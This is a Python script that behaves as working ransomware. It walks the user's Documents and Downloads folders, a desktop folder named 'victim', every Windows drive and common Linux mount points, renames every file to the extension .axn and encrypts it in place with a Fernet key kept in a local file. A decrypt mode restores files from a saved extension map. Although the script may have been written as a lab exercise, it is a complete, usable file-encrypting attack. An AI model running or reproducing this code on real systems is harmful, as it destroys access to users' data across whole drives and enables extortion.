import os
import json
import threading
from datetime import datetime
import random
from cryptography.fernet import Fernet

EXTENSIONS_FILE = "extensions.json"
KEY_FILE = "encryption.key"


# 🔥 Key management
def generate_key():
    """Generate a Fernet encryption key and save it to a file."""
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key


def load_key():
    """Load encryption key from the file."""
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            return f.read()
    else:
        return generate_key()


# 🔒 Encryption & Decryption Functions
def encrypt_file(file_path, key):
    """Encrypt a file."""
    try:
        with open(file_path, "rb") as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(file_path, "wb") as f:
            f.write(encrypted)
        
        print(f"    ✅ Encrypted: {file_path}")

    except Exception as e:
        print(f"    ❌ Error encrypting {file_path}: {e}")


def decrypt_file(file_path, key, original_ext):
    """Decrypt a file."""
    try:
        with open(file_path, "rb") as f:
            encrypted_data = f.read()

        fernet = Fernet(key)
        decrypted = fernet.decrypt(encrypted_data)

        with open(file_path, "wb") as f:
            f.write(decrypted)

        # Restore original extension
        restored_path = change_extension(file_path, original_ext.lstrip('.'))
        print(f"    ✅ Decrypted: {file_path} ➝ {restored_path}")

    except Exception as e:
        print(f"    ❌ Decryption failed: {file_path} - {e}")


# 🔧 Utility Functions
def load_extensions():
    """Load previous file extensions from JSON."""
    if os.path.exists(EXTENSIONS_FILE):
        with open(EXTENSIONS_FILE, "r") as f:
            return json.load(f)
    return {}


def save_extensions(data):
    """Save extensions to JSON."""
    with open(EXTENSIONS_FILE, "w") as f:
        json.dump(data, f, indent=4)


def change_extension(file_path, new_extension):
    """Change file extension with conflict handling."""
    dir_name, file_name = os.path.split(file_path)
    base, _ = os.path.splitext(file_name)

    new_file_name = f"{base}.{new_extension.lstrip('.')}"
    new_file_path = os.path.join(dir_name, new_file_name)

    # Avoid conflicts
    if os.path.exists(new_file_path):
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_suffix = random.randint(1000, 9999)
        new_file_name = f"{base}_{timestamp}_{random_suffix}.{new_extension.lstrip('.')}"
        new_file_path = os.path.join(dir_name, new_file_name)

    os.rename(file_path, new_file_path)
    return new_file_path


# 📂 Target directories
directories_to_process = [
    os.path.join(os.path.expanduser("~"), "Desktop", "victim"),
    os.path.join(os.path.expanduser("~"), "Documents"),
    os.path.join(os.path.expanduser("~"), "Downloads")
]

# Add other drives (Windows-specific)
if os.name == 'nt':
    import string
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    directories_to_process.extend(drives)
else:
    directories_to_process.extend([
        "/mnt", "/media", "/run/media"
    ])


# 🔒 Main Execution with Multithreading
key = load_key()
original_ext = load_extensions()

threads = []

# 🔥 Encrypt or Decrypt based on user input
action = input("Enter 'e' to encrypt or 'd' to decrypt: ").strip().lower()

for directory in directories_to_process:
    if os.path.exists(directory):
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                _, ext = os.path.splitext(file)

                if action == "e":
                    if ext != ".axn":
                        new_file_path = change_extension(file_path, "axn")
                        original_ext[new_file_path] = ext
                        save_extensions(original_ext)

                        thread = threading.Thread(target=encrypt_file, args=(new_file_path, key))
                        thread.start()
                        threads.append(thread)

                elif action == "d" and ext == ".axn":
                    original_extension = original_ext.get(file_path, ".txt")

                    thread = threading.Thread(target=decrypt_file, args=(file_path, key, original_extension))
                    thread.start()
                    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()

print("\n✅ Operation completed!")
